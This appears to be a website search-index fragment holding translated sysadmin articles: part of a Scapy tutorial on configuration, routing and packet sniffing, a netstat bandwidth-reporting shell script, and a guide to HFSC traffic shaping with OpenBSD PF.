KB/s) - `scapy.py' saved [364,749/364,749] Then simply launch Scapy using the Python interpreter as follows:\nroot@casper:/trash# python scapy.py Welcome to Scapy (v1.1.1 / -) \u003e\u003e\u003e If we want to get information about the configuration of the Scapy version we’re using, simply type conf and press Enter to validate and execute the command:\n\u003e\u003e\u003e conf Version = v1.1.1 / - ASN1_default_codec = AS_resolver = \u003c__main__.AS_resolver_multi instance at 0x87f612c\u003e BTsocket = IPCountry_base = 'GeoIPCountry4Scapy.gz' L2listen = L2socket = L3socket = auto_fragment = 1 checkIPID = 0 checkIPaddr = 1 checkIPsrc = 1 check_TCPerror_seqack = 0 color_theme = countryLoc_base = 'countryLoc.csv' debug_dissector = 0 debug_match = 0 ethertypes = except_filter = '' gnuplot_world = 'world.dat' histfile = '/root/.scapy_history' iface = 'ath0' manufdb = mib = nmap_base = '/usr/share/nmap/nmap-os-fingerprints' noenum = p0f_base = '/etc/p0f/p0f.fp' padding = 1 prog = Version = v1.1.1 / - display = 'display' dot = 'dot' hexedit = 'hexer' pdfreader = 'acroread' psreader = 'gv' tcpdump = 'tcpdump' tcpreplay = 'tcpreplay' wireshark = 'wireshark' promisc = 1 prompt = '\u003e\u003e\u003e ' protocols = queso_base = '/etc/queso.conf' resolve = route = Network Netmask Gateway Iface Output IP 127.0.0.0 255.0.0.0 0.0.0.0 lo 127.0.0.1 192.168.0.0 255.255.255.0 0.0.0.0 ath0 192.168.0.2 0.0.0.0 0.0.0.0 192.168.0.1 ath0 192.168.0.2 services_tcp = services_udp = session = '' sniff_promisc = 1 stealth = 'not implemented' verb = 2 warning_threshold = 5 wepkey = '' Scapy also allows us to choose to view only part of the configuration if we want, here we want to display only information related to the routing table using the conf.route command:\n\u003e\u003e\u003e conf.route Network Netmask Gateway Iface Output IP 127.0.0.0 255.0.0.0 0.0.0.0 lo 127.0.0.1 192.168.0.0 255.255.255.0 0.0.0.0 ath0 192.168.0.2 0.0.0.0 0.0.0.0 192.168.0.1 ath0 192.168.0.2 By default, this information is equivalent to the routing information delivered by the system command route:\nroot@casper:~# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 192.168.0.0 * 255.255.255.0 U 0 0 0 ath0 default 192.168.0.1 0.0.0.0 UG 0 0 0 ath0 To add an entry to the routing table we just viewed, use the conf.route.add command:\n\u003e\u003e\u003e conf.route.add(net=\"192.168.1.0/24\",gw=\"192.168.0.1\") We verify that the routing entry has been added for the 192.168.1.0/24 network with the machine whose IP address is 192.168.0.1 as gateway:\n\u003e\u003e\u003e conf.route Network Netmask Gateway Iface Output IP 127.0.0.0 255.0.0.0 0.0.0.0 lo 127.0.0.1 192.168.0.0 255.255.255.0 0.0.0.0 ath0 192.168.0.2 0.0.0.0 0.0.0.0 192.168.0.1 ath0 192.168.0.2 192.168.1.0 255.255.255.0 192.168.0.1 ath0 192.168.0.2 Now we check the system routing table for the second time:\nroot@casper:~# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 192.168.0.0 * 255.255.255.0 U 0 0 0 ath0 default 192.168.0.1 0.0.0.0 UG 0 0 0 ath0 The routing tables between the system and Scapy are different because Scapy has its own internal routing table.\nWe delete this entry with the conf.route.delt command, still for the 192.168.1.0/24 network with a machine acting as gateway whose IP address is 192.168.0.1:\n\u003e\u003e\u003e conf.route.delt(net=\"192.168.1.0/24\",gw=\"192.168.0.1\") We verify that the corresponding routing entry has been removed from Scapy’s internal routing table:\n\u003e\u003e\u003e conf.route Network Netmask Gateway Iface Output IP 127.0.0.0 255.0.0.0 0.0.0.0 lo 127.0.0.1 192.168.0.0 255.255.255.0 0.0.0.0 ath0 192.168.0.2 0.0.0.0 0.0.0.0 192.168.0.1 ath0 192.168.0.2 Indeed, the entry is no longer present in the internal routing table; if we had wanted to add a route only to a particular machine, we could have used the following syntax (host= instead of net=) to specify that packets/frames destined for the machine whose IP address is 192.168.1.3 must be routed to the machine whose IP is 192.168.0.1, which thus acts as a gateway to access it:\n\u003e\u003e\u003e conf.route.add(host=\"192.168.1.3\",gw=\"192.168.0.1\") We can also change the network interface with which we want to work by default using the conf.iface command:\n\u003e\u003e\u003e conf.iface='eth0' \u003e\u003e\u003e conf.iface 'eth0' \u003e\u003e\u003e conf.iface='ath0' \u003e\u003e\u003e conf.iface 'ath0' The system is now fully functional, and we can move on to the packet/data frame manipulation functions offered by Scapy.\nBasic Usage linkThis part of the Scapy documentation proposes to give an overview of the basic commands available in Scapy. It also includes different examples of their use that will allow you to become familiar with the internal functioning of this tool in order to better understand its principles.\nFirst, we list all the protocols supported by Scapy using the ls() command:\n\u003e\u003e\u003e ls() ARP : ARP ASN1_Packet : None BOOTP : BOOTP CookedLinux : cooked linux DHCP : DHCP options DNS : DNS DNSQR : DNS Question Record DNSRR : DNS Resource Record Dot11 : 802.11 Dot11ATIM : 802.11 ATIM Dot11AssoReq : 802.11 Association Request Dot11AssoResp : 802.11 Association Response Dot11Auth : 802.11 Authentication Dot11Beacon : 802.11 Beacon Dot11Deauth : 802.11 Deauthentication Dot11Disas : 802.11 Disassociation Dot11Elt : 802.11 Information Element Dot11ProbeReq : 802.11 Probe Request Dot11ProbeResp : 802.11 Probe Response Dot11ReassoReq : 802.11 Reassociation Request Dot11ReassoResp : 802.11 Reassociation Response Dot11WEP : 802.11 WEP packet Dot1Q : 802.1Q Dot3 : 802.3 EAP : EAP EAPOL : EAPOL Ether : Ethernet GPRS : GPRSdummy GRE : GRE HCI_ACL_Hdr : HCI ACL header HCI_Hdr : HCI header HSRP : HSRP ICMP : ICMP ICMPerror : ICMP in ICMP IP : IP IPerror : IP in ICMP IPv6 : IPv6 not implemented here. ISAKMP : ISAKMP ISAKMP_class : None ISAKMP_payload : ISAKMP payload ISAKMP_payload_Hash : ISAKMP Hash ISAKMP_payload_ID : ISAKMP Identification ISAKMP_payload_KE : ISAKMP Key Exchange ISAKMP_payload_Nonce : ISAKMP Nonce ISAKMP_payload_Proposal : IKE proposal ISAKMP_payload_SA : ISAKMP SA ISAKMP_payload_Transform : IKE Transform ISAKMP_payload_VendorID : ISAKMP Vendor ID IrLAPCommand : IrDA Link Access Protocol Command IrLAPHead : IrDA Link Access Protocol Header IrLMP : IrDA Link Management Protocol L2CAP_CmdHdr : L2CAP command header L2CAP_CmdRej : L2CAP Command Rej L2CAP_ConfReq : L2CAP Conf Req L2CAP_ConfResp : L2CAP Conf Resp L2CAP_ConnReq : L2CAP Conn Req L2CAP_ConnResp : L2CAP Conn Resp L2CAP_DisconnReq : L2CAP Disconn Req L2CAP_DisconnResp : L2CAP Disconn Resp L2CAP_Hdr : L2CAP header L2CAP_InfoReq : L2CAP Info Req L2CAP_InfoResp : L2CAP Info Resp LLC : LLC MGCP : MGCP MobileIP : Mobile IP (RFC3344) MobileIPRRP : Mobile IP Registration Reply (RFC3344) MobileIPRRQ : Mobile IP Registration Request (RFC3344) MobileIPTunnelData : Mobile IP Tunnel Data Message (RFC3519) NBNSNodeStatusResponse : NBNS Node Status Response NBNSNodeStatusResponseEnd : NBNS Node Status Response NBNSNodeStatusResponseService : NBNS Node Status Response Service NBNSQueryRequest : NBNS query request NBNSQueryResponse : NBNS query response NBNSQueryResponseNegative : NBNS query response (negative) NBNSRequest : NBNS request NBNSWackResponse : NBNS Wait for Acknowledgement Response NBTDatagram : NBT Datagram Packet NBTSession : NBT Session Packet NTP : NTP NetBIOS_DS : NetBIOS datagram service NetflowHeader : Netflow Header NetflowHeaderV1 : Netflow Header V1 NetflowRecordV1 : Netflow Record NoPayload : None PPP : PPP Link Layer PPPoE : PPP over Ethernet PPPoED : PPP over Ethernet Discovery Packet : None Padding : Padding PrismHeader : Prism header RIP : RIP header RIPEntry : RIP entry RTP : RTP RadioTap : RadioTap dummy Radius : Radius Raw : Raw SMBMailSlot : SMB Mail Slot Protocol SMBNegociate_Protocol_Request_Header : SMBNegociate Protocol Request Header SMBNegociate_Protocol_Request_Tail : SMB Negociate Protocol Request Tail SMBNegociate_Protocol_Response_Advanced_Security : SMBNegociate Protocol Response Advanced Security SMBNegociate_Protocol_Response_No_Security : SMBNegociate Protocol Response No Security SMBNegociate_Protocol_Response_No_Security_No_Key : None SMBNetlogon_Protocol_Response_Header : SMBNetlogon Protocol Response Header SMBNetlogon_Protocol_Response_Tail_LM20 : SMB Netlogon Protocol Response Tail LM20 SMBNetlogon_Protocol_Response_Tail_SAM : SMB Netlogon Protocol Response Tail SAM SMBSession_Setup_AndX_Request : Session Setup AndX Request SMBSession_Setup_AndX_Response : Session Setup AndX Response SNAP : SNAP SNMP : None SNMPbulk : None SNMPget : None SNMPinform : None SNMPnext : None SNMPresponse : None SNMPset : None SNMPtrapv1 : None SNMPtrapv2 : None SNMPvarbind : None STP : Spanning Tree Protocol SebekHead : Sebek header SebekV1 : Sebek v1 SebekV2 : Sebek v3 SebekV2Sock : Sebek v2 socket SebekV3 : Sebek v3 SebekV3Sock : Sebek v2 socket Skinny : Skinny TCP : TCP TCPerror : TCP in ICMP TFTP : TFTP opcode TFTP_ACK : TFTP Ack TFTP_DATA : TFTP Data TFTP_ERROR : TFTP Error TFTP_OACK : TFTP Option Ack TFTP_Option : None TFTP_Options : None TFTP_RRQ : TFTP Read Request TFTP_WRQ : TFTP Write Request UDP : UDP UDPerror : UDP in ICMP _IPv6OptionHeader : IPv6 not implemented here. As we can see, the number of supported protocols is quite substantial; each of these protocols has its own specifications that we can list using the ls() command. Here are the details of the ICMP protocol:\n\u003e\u003e\u003e ls(ICMP) type : ByteEnumField = (8) code : ByteField = (0) chksum : XShortField = (None) id : XShortField = (0) seq : XShortField = (0) To access the full list of commands/functions available in Scapy, we must use the lsc() command:\n\u003e\u003e\u003e lsc() sr : Send and receive packets at layer 3 sr1 : Send packets at layer 3 and return only the first answer srp : Send and receive packets at layer 2 srp1 : Send and receive packets at layer 2 and return only the first answer srloop : Send a packet at layer 3 in loop and print the answer each time srploop : Send a packet at layer 2 in loop and print the answer each time sniff : Sniff packets p0f : Passive OS fingerprinting: which OS emitted this TCP SYN? arpcachepoison : Poison target's cache with (your MAC,victim's IP) couple send : Send packets at layer 3 sendp : Send packets at layer 2 traceroute : Instant TCP traceroute arping : Send ARP who-has requests to determine which hosts are up ls : List available layers, or infos on a given layer lsc : List user commands queso : Queso OS fingerprinting nmap_fp : nmap fingerprinting report_ports : portscan a target and output a LaTeX table dyndns_add : Send a DNS add message to a nameserver for \"name\" to have a new \"rdata\" dyndns_del : Send a DNS delete message to a nameserver for \"name\" is_promisc : Try to guess if target is in Promisc mode. The target is provided by its ip. promiscping : Send ARP who-has requests to determine which hosts are in promiscuous mode To display the documentation for a particular function, simply add the .doc extension behind the command (without the final ()); so to display the documentation for the arping() command, it will be necessary to type the following syntax:\n\u003e\u003e\u003e arping.__doc__ 'Send ARP who-has requests to determine which hosts are up\\narping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -\u003e None\\nSet cache=True if you want arping to modify internal ARP-Cache' It’s also possible to get the same documentation result but with a bit more layout using the lsc() command that allowed us to list the available commands in Scapy earlier; just add the name of the command in parentheses that you want documentation for:\n\u003e\u003e\u003e lsc(arping) Send ARP who-has requests to determine which hosts are up arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -\u003e None Set cache=True if you want arping to modify internal ARP-Cache Data Capturing linkScapy can function like a network traffic analyzer to capture data for later viewing. This part of the documentation offers different examples of captures as well as the many ways available internally to view the results of these captures.\nWe display the documentation for the sniff() function using the lsc() function:\n\u003e\u003e\u003e lsc(sniff) Sniff packets sniff([count=0,] [prn=None,] [store=1,] [offline=None,] [lfilter=None,] + L2ListenSocket args) -\u003e list of packets count: number of packets to capture. 0 means infinity store: wether to store sniffed packets or discard them prn: function to apply to each packet. If something is returned, it is displayed. Ex: ex: prn = lambda x: x.summary() lfilter: python function applied to each packet to determine if further action may be done ex: lfilter = lambda x: x.haslayer(Padding) offline: pcap file to read packets from, instead of sniffing them timeout: stop sniffing after a given time (default: None) L2socket: use the provided L2socket Now we launch a sniff on all UDP protocol traffic for the machine with IP address 192.168.0.2 with a maximum of 30 packets collected (using count):\n\u003e\u003e\u003e sniff(filter=\"udp and host 192.168.0.2\", count=30) The 30 packets have been collected for the UDP protocol and the machine whose IP address is 192.168.0.2; we can view the results related to this capture by assigning the records to the variable sn via the variable _ in the following way:\n\u003e\u003e\u003e sn=_ If we want to view all these records contained in the variable sn, we need to add .nsummary() after the name of the variable that we chose when assigning the results of a function (here the sniff function and the sn variable):\n\u003e\u003e\u003e sn.nsummary() 0000 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0001 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0002 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0003 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0004 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0005 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0006 Ether / IP / UDP 192.168.0.1:netbios_ns \u003e 192.168.0.255:netbios_ns / NBNSQueryRequest 0007 Ether / IP / UDP 192.168.0.1:netbios_ns \u003e 192.168.0.255:netbios_ns / NBNSQueryRequest 0008 Ether / IP / UDP 192.168.0.1:netbios_ns \u003e 192.168.0.255:netbios_ns / NBNSQueryRequest 0009 Ether / IP / UDP 192.168.0.1:netbios_dgm \u003e 192.168.0.255:netbios_dgm / NBTDatagram / Raw 0010 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0011 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0012 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0013 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0014 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0015 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0016 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0017 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0018 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0019 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0020 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0021 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0022 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0023 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0024 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0025 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0026 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0027 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0028 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw 0029 Ether / IP / UDP 192.168.0.1:1900 \u003e 239.255.255.250:1900 / Raw Sn is considered here as an object in its own right on which we can apply different operations via appropriate functions like nsummary() here; to view in detail the first record contained in the variable sn, we need to add between [] the number of the record that we want to view in the traffic we just captured and this just behind the name of the variable:\n\u003e\u003e\u003e sn[0] "
            }
        );
    index.add(
            {
                id:  727 ,
                href: "\/Statistiques_sur_la_bande_passante_occup%C3%A9e\/",
                title: "Bandwidth Usage Statistics",
                description: "A simple shell script to calculate and monitor bandwidth usage on external network interfaces for BSD and Linux systems.",
                content: "Introduction linkHere is a simple shell script to calculate the bandwidth usage on the external interface of a BSD or Linux box. Netstat bandwidth summary works well on OpenBSD 4.1, but colleagues have mentioned 3.9 may not work. Linux should work without issue. Also, remember that the netstat stats will reset on reboot of the box.\nOne could use this script to keep track of Internet bandwidth in case their ISP accused them of using too much bandwidth. Comcast for example will call foul if you use more than 90 to 150 gigabytes of download per month. We can only guess that the upload limit is the same. Verizon says they do not have a limit, but they will contact bandwidth abusers. Your ISP might have different rules so check with them. Then use this simple tool to make sure you know what you are using.\nThis is what the report of my system looks like…\nExternal interface bandwidth usage: uptime 16 days ExtIf in total 13 GBytes ExtIf out total 16 GBytes ExtIf in/day 831 MBytes/day ExtIf out/day 986 MBytes/day ExtIf in/30day 24 GBytes/month ExtIf out/30day 29 GBytes/month Script linkYou could put the executable line into /etc/daily on the 13th line. This way you will get an email in the “daily output” email the BSD box sends and includes the above stats.\nHere is the script called “calomel_interface_stats.sh”:\n#!/usr/local/bin/bash SECS=`uptime | awk '{print $3}'` EXT_IN=`netstat -I em0 -b | tail -1 | awk '{print $5}'` EXT_OUT=`netstat -I em0 -b | tail -1 | awk '{print $6}'` echo \" \" echo \"External interface bandwidth usage:\" echo \" uptime \" $(($SECS/86400)) \"days\" echo \" ExtIf in total \" $(($EXT_IN/1000033000)) \"GBytes\" echo \" ExtIf out total \" $(($EXT_OUT/1000033000)) \"GBytes\" echo \" ExtIf in/day \" $(($EXT_IN*86400/SECS/1000033)) \"MBytes/day\" echo \" ExtIf out/day \" $(($EXT_OUT*86400/SECS/1000033)) \"MBytes/day\" echo \" ExtIf in/30day \" $(($EXT_IN*86400*30/SECS/1000033000)) \"GBytes/month\" echo \" ExtIf out/30day \" $(($EXT_OUT*86400*30/SECS/1000033000)) \"GBytes/month\" "
            }
        );
    index.add(
            {
                id:  728 ,
                href: "\/Faire_de_la_QOS_(Quality_Of_Service)_avec_PF\/",
                title: "QoS (Quality Of Service) with PF",
                description: "How to implement Quality of Service (QoS) using Packet Filter (PF) in OpenBSD to prioritize different types of network traffic.",
                content: "Introduction linkHierarchical Fair Service Curve (HFSC) alias QOS: Quality of Service (QoS) is an attempt to give priority to a packet type or data connection on a per session basis. Hierarchical Fair Service Curve takes QoS to the next level over CBQ by focusing on guaranteed real-time, adaptive best-effort, and hierarchical link-sharing service.\nThough this may sound difficult, it is really easy to use once you understand the basics.\nWhat HSFC means without technical jargon is, you have the ability to setup rules to govern how data leaves the system. For example…\nYou may choose to have ack packets labeled with the highest priority to guarantee those packets go out first. Ack packets are the way you tell the remote system you have received the last payload and to continue to send the next. This will make sure you data transfers go as fast as they can even on a saturated connection.\nWhat if you are an avid gamer and other users on your network are slowing your connection down or causing you to loose your connection. You choose to give priority to your gaming traffic over normal web traffic. This way you can play games without slowing down and keep your latency low while other users on the network browse the web and download files.\nWhat if you are running a web server and you find the majority of your data is text based and is less than 10KB per page, but you do have a few larger data files around 5MB. You decide you want to serve out data quickly in the beginning of the connection and slow down after a few seconds. You can setup HFSC to serve out the first few seconds of a connection at full speed, lets say 100KB/sec and then slow the connection down after 5 seconds to 25KB/sec. This allows you to serve out your page at full speed and still allow people to download the 5MB files at slow speed, saving band with for other new web clients.\nQuality of Service gives you the tools you need to shape traffic.\nSet of commands linkLet’s take a look at the basic set of commands in HFSC and why you would use them in the real world:\nbandwidth linkThe percentage of the total connection speed this queue is allowed to borrow from the total queue or other queues. This variable can be not equal zero(0) and the bandwidth values for all of the queues can not exceed 100% of the available connection. This value is not to be confused with “bandwidth” as a value to describe the amount of data that can be transferred to or from a server, but a as directive specifying the amount of total connection speed this queue can borrow.\npriority linkThe level specifies the order in which a service is to occur relative to other queues. The higher the number or value, the higher the priority. This directive is a simple way of saying which packets are first out of the gate compared to others. Let’s say you have gaming data and bulk web data. You want gaming data to be first since it is interactive and bulk web traffic can wait. Set the gaming data queue at least 1 priority level higher than the bulk web traffic queue.\nqlimit linkThe amount of “slots” available to a queue to save outgoing packets when the amount of available bandwidth has been exceeded. This value is 50 by default. When the total amount of bandwidth has been reached on the outgoing interface or higher queues are taking up all of the bandwidth then no more data can be sent. The qlimit will put the packets the queue can not send out into slots in memory in the order that they arrive. When bandwidth is available the qlimit slots will be emptied in the order they arrived; first in, first out. If the qlimit reaches the maximum value of qlimit, the packets will be dropped. Look at qlimit slots as “emergency use only,” but as a better alternative to dropping the packets out right. Also, do not think that setting the qlimit really high will solve the problem of bandwidth starvation and packet drops. What you want to do is setup a queue with the proper bandwidth boundaries so that packets only go into the qlimit slots for a short time, if ever.\nrealtime linkThe amount of bandwidth that is guaranteed to the queue no matter what any other queue needs. Realtime can be set from 0% to 80% of total connection bandwidth. Let’s say you want to make sure that your web server gets 25KB/sec of bandwidth no matter what. Setting the realtime value will give the webserver queue the bandwidth it needs even if other queues want to share its bandwidth.\nupperlimit linkThe amount of bandwidth the queue can never exceed. For example, say you want to setup a new mail server and you want to make sure that the server never takes up more than 50% of your available bandwidth. Or let’s say you have a p2p user you need to limit. Using the upperlimit value will keep them from abusing the connection.\nlinkshare linkThis value has the exact same use as “bandwidth” above. If you decide to use both “bandwidth” and “linkshare” in the same rule pf(OpenBSD 4.1) will just drop “linkshare”. For this reason we are not going to use it.\ndefault linkThe default queue. As data connections or rules that are specifically put into a queue will be put into this queue rule. This directive must be in one rule. You can not have two(2) default directives in any two(2) rules.\nSetup HFSC linkNow, let’s take a look at a common HFSC queue setup. The following group of rules splits data into 6 subsets and gives each one of them specific data tasks and limits. You do not have to follow this example exactly, especially since you have the definitions above. Let me explain what each line does and why it is used then you can decide for yourself.\n#Comcast Upload = 768Kb/s (queue at 97%) altq on $ExtIf bandwidth 744Kb hfsc queue { ack, dns, ssh, bulk, bittor, spamd } queue ack bandwidth 80% priority 7 qlimit 500 hfsc (realtime 50%) queue dns bandwidth 7% priority 6 qlimit 500 hfsc (realtime 5%) queue ssh bandwidth 10% priority 5 qlimit 500 hfsc (realtime 20%) {ssh_bulk, ssh_login} queue ssh_login bandwidth 90% priority 5 qlimit 500 hfsc queue ssh_bulk bandwidth 10% priority 4 qlimit 500 hfsc queue bulk bandwidth 1% priority 4 qlimit 500 hfsc (realtime 5% default) queue bittor bandwidth 1% priority 3 qlimit 500 hfsc (upperlimit 99%) queue spamd bandwidth 1% priority 2 qlimit 500 hfsc (upperlimit 1%) The first line is simply a comment. It reminds one that comcast’s total upload bandwidth is 768Kb/s (kilobits per second). You never want to use exactly the total upload speed, but a few kilobytes less. On comcast 97% works very well. Why? Because you want to use your queue as the limiting factor in the connection. When you send out data and you saturate your link the router you connect to will decide what packets go first and that is what we want HSFC to do. You can not trust your upstream router to forward packets correctly. It may be that the router maintainer does not care, the router does not have the ability, or the router it too old. So, we limit the upload speed to just under the total available. “Doesn’t that waste some bandwidth then?” Yes, in this example we are not using 3KB/s, but remember we are making sure the upstream routers sends out the packets in the order we want, not what they decide. This makes all the difference with ACK packets especially and will actually increase the available bandwidth on a saturated connection\nThe second line is the parent queue for the external interface ($ExtIf), it shows we are using “hfsc queue” and lists out all six(6) of the child queues (ack, dns, ssh, bulk, bittor, spamd). This is where we specify the bandwidth limit at 97% of the total 768Kb = 744Kb.\nThe next set of lines specify the 6 child queues and also two sub-child queues in the ssh rule. All of these rules use the external interface and are limited by the parent queue’s bandwidth limitations.\nNote: REMEMBER: Do not set your upload bandwidth too high otherwise the queue in pf will be useless. A safe rule is to set the maximum bandwidth at around 97% of the total upload speed available to you. Setting your max speed lower is preferable to setting it too high.\nqueue ack bandwidth 80% priority 7 qlimit 500 hfsc (realtime 50%) This is the ack queue. it can borrow as little as 80% of the total bandwidth, it is the highest priority at 7, and has a very high queue limit of 500 slots. The realtime of 50% means this queue is guaranteed at least 50% of the total bandwidth no matter what any other rules want.\nThe highest priority queue is for ack (acknowledge) packets. Ack packets are the method your system tells the remote systems that you have received the payload they sent and to send the next one. By prioritizing these packets you can keep your transfer rates high even on a highly saturated link. For example, if you are downloading a file and you receive a chunk of data the remote system will not send you the next chunk of data until you send them an OK. The OK is the ack packet. When you send the ack packet the remote system knows you got the packet and it has checked out, thus it will send the next one. If on the other hand you delay ack packets, the transfer rate will diminish quickly because the remote system won’t send anything new until you respond.\nqueue dns bandwidth 7% priority 6 qlimit 500 hfsc (realtime 5%) This is the dns queue. it can borrow as little as 7% of the total bandwidth, it is the second highest priority at 6, and has a very high queue limit of 500 slots. The realtime of 5% means this queue is guaranteed at least 5% of the total bandwidth no matter what any other rules want.\nThis queue is simple to make sure dns packets get out on time. Though this is not really necessary your web browsing users will be thankful. When you go to a site or enter a URL the clients need the ip of the server. This rule simply allows dns queries to go out before other traffic.\nqueue ssh bandwidth 10% priority 5 qlimit 500 hfsc (realtime 20%) {ssh_login, ssh_bulk} queue ssh_login bandwidth 90% priority 5 qlimit 500 hfsc queue ssh_bulk bandwidth 10% priority 4 qlimit 500 hfsc This is the ssh parent and child queues. The parent queue can borrow as little as 10% of the total bandwidth, it is at priority at 5, and has a very high queue limit of 500 slots. The realtime of 20% means this queue is guaranteed at least 20% of the total bandwidth.\nThe two(2) child queues are for ssh’s interactive logins (ssh_login) and bulk transfer data like scp/sftp (ssh_bulk). These two queues are under the parent queue and both divide the parent’s bandwidth of 10% of the total bandwidth. In this example we want to make sure interactive ssh like the console has at least 90% of the bandwidth. The rest of the bandwidth at 10% is used for bulk transfers like scp and sftp transfers. Both child queues do have the ability to share bandwidth from each other. The priorities of the ssh child queues are independent of all of the other queues. We could have picked any other priorities as long as ssh_login was higher than ssh_bulk.\nqueue bulk bandwidth 1% priority 4 qlimit 500 hfsc (realtime 5% default) This is the bulk queue. The bulk queue can borrow as little as 1% of the total bandwidth, it is at priority at 4, and has a very high queue limit of 500 slots. The realtime of 5% means this queue is guaranteed at least 5% of the total bandwidth no matter what any other rules want.\nThis queue is where all of the general traffic will go. If one does not specify a queue for a rule, that traffic will go here. Notice the directive “default” after the realtime tag.\nOne also has the option of changing the realtime speed over time. In the following example the bulk queue has been changed. This time we will transfer 37kb/s for 5000 milliseconds and then drop the speeds down to 10kb/sec. This might be useful to keep short bursts fast, but slow down big downloads.\nqueue bulk bandwidth 1% priority 4 qlimit 500 hfsc (realtime 37kb 5000 10kb default) queue bittor bandwidth 1% priority 3 qlimit 500 hfsc (upperlimit 99%) This is bittor queue. The bittor queue can borrow as little as 1% of the total bandwidth, it is at priority at 3, and has a very high queue limit of 500 slots. Notice this rule does not have a real time directive. This is because we have decided that bittor traffic is expendable and we want to make sure this queue gives up all bandwidth to higher priority queues that need it. The upperlimit directive makes sure this rule will never borrow more than 99% of the total bandwidth from any other queue.\nThis rule is here to show that one can use peer sharing tools and still have control of their network. You will notice that remote clients using peer 2 peer sharing tools connecting will hammer your connection. This rule will allow the data to transfer at up to 99% of your full speed, but if another queue needs the bandwidth, the bittor queue will be pruned almost instantly to 1%. Imagine if you are getting the latest OpenBSD distro through a torrent and then you want to browse the web. Normally, you would experience a slow connection because you are fighting for bandwidth. With this rule your browsing traffic gets the bandwidth it needs instantly. The bittor queue on the other hand gets reduced and starts using the qlimit slots until you are done using the bandwidth browsing. Best of both worlds.\nqueue spamd bandwidth 1% priority 2 qlimit 500 hfsc (upperlimit 1%) This is spamd queue. The spamd queue can borrow as little as 1% of the total bandwidth, it is at lowest priority of 2, and has a very high queue limit of 500 slots. Notice this rule does not have a real time directive. This is because we have decided that spamd traffic is expendable and we want to make sure this queue gives up all bandwidth if higher priority queues need it. The upperlimit directive makes sure this rule will never borrow more than 1% of the total bandwidth from any other queue.\nThis rule is used for spammers and is linked to the spamd daemon to annoy spammers. Since the traffic on this queue has very low traffic requirements we have decided to set the upper and lower bounds at 1% of the total bandwidth. Even with 100 spammers connected less than 1KB/sec is more than enough to annoy them. Even if you had more spammers connected the queue would never use more than 1% of the bandwidth. Any extra packets would go into qlimit and if that fills would then packets would be dropped. No problem since the data is expendable.\nNow that we have taken a detailed look at the queue rules and directives, we now need to look at a way to apply those queues to our pf rules.\nHere we have two(2) examples of rules you can use queuing on. Notice the queue names we used above like ack, bulk, ssh_login, and ssh_bulk at the end of the rules. Also, notice the order that we have put the two queues in on each rule. The first queue name in “bulk, ack” is for general data and the second “ack” is for special short length packets.\npass out on $ExtIf inet proto tcp from ($ExtIf) to any flags S/SA modulate state queue (bulk, ack) pass out on $ExtIf inet proto tcp from ($ExtIf) to any port ssh flags S/SA modulate state queue (ssh_bulk, ssh_login) The first rule is passing out bulk traffic on the external interface and prioritizing ack packets. The second rule is passing out data on port 22(ssh) and prioritizing the interactive ssh traffic. This traffic is originating on our internal network or on the firewall itself.\nIf we decided to have a rule with only one queue directive it would look like this:\npass out on $ExtIf inet proto tcp from ($ExtIf) to any flags S/SA modulate state queue (bulk) You can also queue data on the return trip on an external stateful connection. Remember you can not queue data coming into the box, only going out. Let’s say you have a web server and clients from the outside connect to you and you want their data responses to be queued. The following works perfectly.\npass in on $ExtIf inet proto tcp from any to ($ExtIf) port www flags S/SA modulate state queue (bulk, ack) So, now you have read all about queuing and you have applied the queue tags to your rules. Now you need to verify that what you setup works actually does what you thought it should do. You should first install “pftop” from the OpenBSD package collection. It is a very easy install without any dependencies. You can also install the latest version from source without issue.\nThe following is an example output from “table #8” in pftop. To get to this table start pftop and press #8 on the keyboard.\npfTop: Up Queue 1-9/9, View: queue, Cache: 10000 QUEUE BW SCH PRIO PKTS BYTES DROP_P DROP_B QLEN BORROW SUSPEN P/S B/S root_rl0 744K hfsc 0 0 0 0 0 0 0 0 ack 595K hfsc 7 0 0 0 0 0 0 0 dns 52080 hfsc 6 0 0 0 0 0 0 0 ssh 74400 hfsc 5 0 0 0 0 0 0 0 ssh_login 66960 hfsc 5 83 13538 0 0 0 